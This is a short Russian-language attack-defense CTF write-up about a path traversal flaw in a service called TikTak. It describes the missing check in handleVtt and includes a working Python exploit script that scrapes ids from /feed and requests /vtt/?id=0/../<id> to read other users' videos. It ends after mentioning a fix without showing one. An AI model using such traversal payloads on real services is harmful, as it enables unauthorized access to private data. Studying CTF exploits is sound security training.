# Path traversal в TikTak

Отсутствие проверки в handleVtt и использование path.Join с вволом пользователя приводит к чтению произовльных видео

Пустой результат от базы данных трактуется как разрешенный


sploit для destructive farm

```
import requests
import sys
import re


base_url = "http://" + sys.argv[1] + ":4000"

ids = re.findall(r'D:</b> (\d+)<', requests.get(base_url + '/feed').text)

for id_ in ids:
    print(id_)
    print(requests.get(base_url + "/vtt/?id=0/../" + id_).text)
```

Для исправления достаточно проверять, что результат не пуст:

